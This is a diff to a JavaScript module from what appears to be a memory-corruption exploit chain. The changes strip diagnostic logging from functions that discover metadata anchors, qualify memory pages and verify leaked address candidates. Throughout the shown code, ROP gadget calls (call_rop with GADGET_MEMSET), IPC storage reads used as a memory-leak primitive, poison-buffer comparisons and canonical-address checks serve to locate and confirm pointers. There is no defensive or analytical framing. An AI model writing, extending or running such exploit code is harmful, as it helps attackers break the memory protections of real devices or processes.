@@ -18,17 +18,15 @@ const {
   call_rop,
   hex32,
   ipcStorageRead,
-  log,
   read64
 } = coreRuntime;
 
 // ── Pool and metadata discovery ───────────────────────────────────────────
 
 export async function reportMetadataProgress(input, message) {
-    if (typeof input.reportProgress === "function")
-        await input.reportProgress(message);
-    else
-        await log(message);
+    if (typeof input.reportProgress !== "function") return;
+
+    await input.reportProgress(message);
 }
 
 async function readExternalLinkWindow(input) {
@@ -212,8 +210,6 @@ export async function discoverMetadataAnchors(seedPlan, label, input) {
     if (!poolResult.ok) return withStepData({ok: false,
         continueSeed: poolResult.continueSeed, error: poolResult.error});
     if (!poolResult.candidates.length) {
-        await log("METADATA " + label +
-            ": no pool hypotheses remain; external-link checks=0");
         return withStepData({ok: true, anchors: [], continueSeed: true,
             unresolved: Boolean(poolResult.unresolved), poolCandidates: 0,
             nativeLinks: poolResult.links,
@@ -233,8 +229,6 @@ export async function discoverMetadataAnchors(seedPlan, label, input) {
         var anchorAddress = poolStart + 0x3a00000;
         if (!Number.isSafeInteger(anchorAddress) ||
             anchorAddress < 0x100000000 || anchorAddress >= 0x8000000000) {
-            await log("METADATA " + label + ": pool candidate " +
-                (poolIndex + 1) + " has a non-canonical external-link address");
             continue;
         }
         var alignedStart = seedPlan.addressBias + Math.floor(
@@ -254,13 +248,8 @@ export async function discoverMetadataAnchors(seedPlan, label, input) {
             candidateHandle, address: alignedStart, length: anchorLength,
             outputBuf: captureBuf, allowedWindow: anchorWindow});
         if (!linkReadA.ok) {
-            await log("METADATA " + label + ": external-link " +
-                (poolIndex + 1) + " read rejected: " + linkReadA.error);
             if (linkReadA.fatal) {
                 if (anchors.length > 0) {
-                    await log("METADATA " + label +
-                        ": preserving " + anchors.length +
-                        " earlier valid anchor(s) after read error");
                     return withStepData({ok: true, anchors: anchors, continueSeed: false,
                         stopAfterAnchors: true, error: linkReadA.error});
                 }
@@ -274,13 +263,8 @@ export async function discoverMetadataAnchors(seedPlan, label, input) {
             candidateHandle, address: alignedStart, length: anchorLength,
             outputBuf: captureBuf, allowedWindow: anchorWindow});
         if (!linkReadB.ok) {
-            await log("METADATA " + label + ": external-link " +
-                (poolIndex + 1) + " repeat rejected: " + linkReadB.error);
             if (linkReadB.fatal) {
                 if (anchors.length > 0) {
-                    await log("METADATA " + label +
-                        ": preserving " + anchors.length +
-                        " earlier valid anchor(s) after repeat-read error");
                     return withStepData({ok: true, anchors: anchors, continueSeed: false,
                         stopAfterAnchors: true, error: linkReadB.error});
                 }
@@ -321,20 +305,11 @@ export async function discoverMetadataAnchors(seedPlan, label, input) {
             if (!distanceOk) rejectionReasons.push("next-distance");
             if (!extentShapeOk) rejectionReasons.push("extent-shape");
             if (!rejectionReasons.length) rejectionReasons.push("parser-rejected");
-            await log("METADATA " + label + ": external-link " +
-                (poolIndex + 1) + "/" + poolResult.candidates.length +
-                " rejected reasons=" + rejectionReasons.join(",") +
-                " stable(next/previous/extent)=" + stableNext + "/" +
-                stablePrevious + "/" + stableExtent +
-                " reciprocal=" + reciprocalOk + " distance=" + distanceOk +
-                " extent=" + extentShapeOk);
             continue;
         }
         var metadataWindow = RootLayout.metadataWindowFromNext(externalLink.next);
         if (!metadataWindow || metadataWindow.anchorOffset + 16 >
             metadataWindow.length) {
-            await log("METADATA " + label + ": next pointer did not " +
-                "produce a bounded metadata page");
             continue;
         }
         var anchorKey = metadataWindow.address.toString(16) + ":" +
@@ -344,20 +319,8 @@ export async function discoverMetadataAnchors(seedPlan, label, input) {
         anchors.push({poolStart: poolStart, nodeAddress: anchorAddress,
             next: Number(externalLink.next), extent: Number(externalLink.extent),
             window: metadataWindow});
-        await log("METADATA " + label + ": external-link " +
-            (poolIndex + 1) + "/" + poolResult.candidates.length +
-            " valid node=0x" + anchorAddress.toString(16) +
-            " next=0x" + externalLink.next.toString(16) +
-            " extent=0x" + externalLink.extent.toString(16) +
-            " page=0x" + metadataWindow.address.toString(16) +
-            " probe=0x" + metadataWindow.length.toString(16));
     }
     var anchorsRemaining = poolCandidatesVisited < poolResult.candidates.length;
-    await log("METADATA " + label + ": external-link checks=" +
-        externalLinkChecks + "/" + poolResult.candidates.length +
-        " candidates-visited=" + poolCandidatesVisited +
-        " valid-anchors=" + anchors.length + " global-checks=" +
-        metadataAnchorChecks + "/" + config.MAX_METADATA_ANCHOR_CHECKS);
     return withStepData({ok: true, anchors: anchors,
         continueSeed: anchors.length === 0,
         capReached: anchorsRemaining &&
@@ -387,21 +350,15 @@ export async function qualifyMetadataPage(anchor, label, pointerTargets, input) 
         plan = CachePlan.buildLowerWindowPlan(page, addressPlan.storageSize,
             config.ROOT_CAPTURE_CHUNK, alignedTargets);
     } catch (planError) {
-        await log("METADATA " + label + ": page plan rejected (" +
-            planError.message + ")");
         return withStepData({ok: false, continueScan: true});
     }
     var encoding = checkAddressHeaderEncoding(plan.bytes, {savedHandle});
     if (!encoding.ok) {
-        await log("METADATA " + label +
-            ": page header encoding rejected");
         return withStepData({ok: false, continueScan: true});
     }
     var window = anchor.window;
     if (window.anchorOffset < 0 || window.anchorOffset + 16 > window.length ||
         page < 0x100000000 || page + window.length >= 0x8000000000) {
-        await log("METADATA " + label +
-            ": page probe bounds rejected");
         return withStepData({ok: false, continueScan: true});
     }
     var ordinaryBuf = allocPage(config.CONTROL_SIZE + 0x2000);
@@ -458,11 +415,6 @@ export async function qualifyMetadataPage(anchor, label, pointerTargets, input) 
     var ordinaryAnchorDiffers = ordinaryFirst !== expectedNode ||
         ordinaryPrevious !== expectedNode;
     var verified = stableAnchor && reciprocalAnchor && ordinaryAnchorDiffers;
-    await log("METADATA " + label + ": page guard=" +
-        (verified ? "PASS" : "FAIL") + " stable-anchor=" + stableAnchor +
-        " reciprocal=" + reciprocalAnchor + " ordinary-anchor-differs=" +
-        ordinaryAnchorDiffers + " page=0x" + page.toString(16) +
-        " anchorOffset=0x" + window.anchorOffset.toString(16));
     return withStepData({ok: verified, continueScan: true, plan: plan,
         page: page, window: window});
 }
@@ -477,15 +429,12 @@ export async function verifyAddressCandidate(plan, label, index, input) {
     addressPlan = plan;
     var ordinaryBuf = allocPage(config.CONTROL_SIZE + 0x2000);
     if (!ordinaryBuf) {
-        await log("ADDRESS " + label + ": ordinary buffer allocation failed");
         return withStepData({verified: false, continueScan: false});
     }
     call_rop(GADGET_MEMSET, ordinaryBuf, 0xA5n, BigInt(config.CONTROL_SIZE));
     var ordinaryReply = ipcStorageRead(storageHandle, plan.readOffset,
         config.CONTROL_SIZE, ordinaryBuf);
     if (ordinaryReply.error !== 0) {
-        await log("ADDRESS " + label + ": ordinary control failed=" +
-            hex32(ordinaryReply.error));
         return withStepData({verified: false, continueScan: false});
     }
 
@@ -494,15 +443,12 @@ export async function verifyAddressCandidate(plan, label, index, input) {
         shouldStop: input.shouldStop});
     addressCopy = headerCopy.addressCopy;
     if (!headerCopy.ok) {
-        await log("ADDRESS " + label +
-            ": header copy failed; stopping candidate scan");
         return withStepData({verified: false, continueScan: false});
     }
 
     var addressBufA = allocPage(config.CONTROL_SIZE + 0x2000);
     var addressBufB = allocPage(config.CONTROL_SIZE + 0x2000);
     if (!addressBufA || !addressBufB) {
-        await log("ADDRESS " + label + ": output buffer allocation failed");
         return withStepData({verified: false, continueScan: false});
     }
     call_rop(GADGET_MEMSET, addressBufA, 0xA5n, BigInt(config.CONTROL_SIZE));
@@ -524,15 +470,6 @@ export async function verifyAddressCandidate(plan, label, index, input) {
             linkHead % 0x4000n === 0n);
     var verified = stable && differsFromControl && changedFromPoison &&
         linkHeadShape;
-    var first16 = readA.error === 0
-        ? readHexBytes(addressBufA, 16) : "unread";
-
-    await log("ADDRESS " + label + ": " +
-        (verified ? "ACCEPTED" : "rejected") +
-        " read=" + hex32(readA.error) + "/" + hex32(readB.error) +
-        " stable=" + stable + " differs=" + differsFromControl +
-        " nonPoison=" + changedFromPoison + " headShape=" + linkHeadShape +
-        " head=0x" + linkHead.toString(16) + " first16=" + first16);
     return withStepData({verified: verified,
         continueScan: readA.error === 0 && readB.error === 0});
 }
